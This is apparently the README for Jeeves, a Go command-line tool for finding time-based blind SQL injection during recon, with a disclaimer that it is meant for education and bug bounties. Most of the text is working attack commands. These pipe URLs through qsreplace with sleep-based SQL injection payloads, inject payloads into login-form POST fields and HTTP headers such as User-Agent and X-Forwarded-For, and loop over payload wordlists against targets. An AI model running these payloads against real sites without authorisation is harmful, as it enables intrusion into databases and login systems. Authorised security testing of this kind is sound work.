[![made-with-Go](https://img.shields.io/badge/made%20with-Go-brightgreen.svg)](http://golang.org)
<h1 align="center">Jeeves</h1> <br>

<p align="center">
  <a href="#--usage--explanation">Usage</a> •
  <a href="#--installation--requirements">Installation</a>
</p>

<h3 align="center">Jeeves is made for looking to Time-Based Blind SQLInjection through recon.</h3>
<img src="gojayyyy.png">

## Contents:

- [Installation](#--installation--requirements)
- [Usage](#--usage--explanation)
  - [Adding Headers](#adding-headers)
  - [Using Proxy](#using-proxy)
  - [Making Post Request](#post-request)
  - [Multiple ways of usage](#another-ways-of-usage)


## - Installation & Requirements:

Installing Jeeves 💀

```bash
$ go install github.com/ferreiraklet/Jeeves@latest
```
OR
```bash 
$ git clone https://github.com/ferreiraklet/Jeeves.git
$ cd Jeeves
$ go build jeeves.go
$ chmod +x jeeves
$ ./jeeves -h
```
<br>


## - Usage & Explanation:
In Your recon process, you may find endpoints that can be vulnerable to sql injection,
Ex: https://redacted.com/index.php?id=1
    
### Single urls

```bash
echo 'https://redacted.com/index.php?id=your_time_based_blind_payload_here' | jeeves -t payload_time
echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5
echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(10)))v)" | jeeves -t 10
```

In --payload-time you must use the time mentioned in payload

<br>

### From list 

```cat targets | jeeves --payload-time 5```
    
### Adding Headers

Pay attention to the syntax! Must be the same =>

```bash
echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves -t 5 -H "Testing: testing;OtherHeader: Value;Other2: Value"
```

### Using proxy

```bash
echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves -t 5 --proxy "http://ip:port"
echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves -t 5 -p "http://ip:port"
```
<br>

Proxy + Headers =>

```bash
echo "http://testphp.vulnweb.com/artists.php?artist=" | qsreplace "(select(0)from(select(sleep(5)))v)" | jeeves --payload-time 5 --proxy "http://ip:port" -H "User-Agent: xxxx"
```

### Post Request

Sending data through post request ( login forms, etc )

Pay attention to the syntax! Must be equal! ->

```bash
echo "https://example.com/Login.aspx" | jeeves -p 10 -d "user=(select(0)from(select(sleep(5)))v)&password=xxx"
echo "https://example.com/Login.aspx" | jeeves -p 10 -H "Header1: Value1" -d "username=admin&password='+(select*from(select(sleep(5)))a)+'" -p "http://yourproxy:port"
```

## Another ways of Usage

You are able to use of Jeeves with other tools, such as gau, gauplus, waybackurls, qsreplace and bhedak, mastering his strenght

<br>

**Command line flags**:
```bash
 Usage:
 -t, --payload-time,  The time from payload
 -p, --proxy          Send traffic to a proxy
 -c                   Set Concurrency, Default 25
 -H, --headers        Custom Headers
 -d, --data           Sending Post request with data
 -h                   Show This Help Message
```  

<br> 

Using with sql payloads wordlist

```bash
cat sql_wordlist.txt | while read payload;do echo http://testphp.vulnweb.com/artists.php?artist= | qsreplace $payload | jeeves -t 5;done
```

Testing in headers

```bash
echo "https://target.com" | jeeves -H "User-Agent: 'XOR(if(now()=sysdate(),sleep(5*2),0))OR'" -t 10
echo "https://target.com" | jeeves -H "X-Forwarded-For: 'XOR(if(now()=sysdate(),sleep(5*2),0))OR'" -t 10

Payload credit: https://github.com/rohit0x5
```

OBS: 
* Does not follow redirects, If the Status Code is diferent than 200, it returns "Need Manual Analisys"
* Jeeves does not http probing, he is not able to do requests to urls that does not contain protocol ( http://, https:// )
<br>

## This project is for educational and bug bounty porposes only! I do not support any illegal activities!.

If any error in the program, talk to me immediatly.


## Please, also check these => <br>
> [Nilo](https://github.com/ferreiraklet/nilo) - Checks if URL has status 200

> [SQLMAP](https://github.com/sqlmapproject/sqlmap)

> [Blisqy](https://github.com/JohnTroony/Blisqy) Header time based SQLI
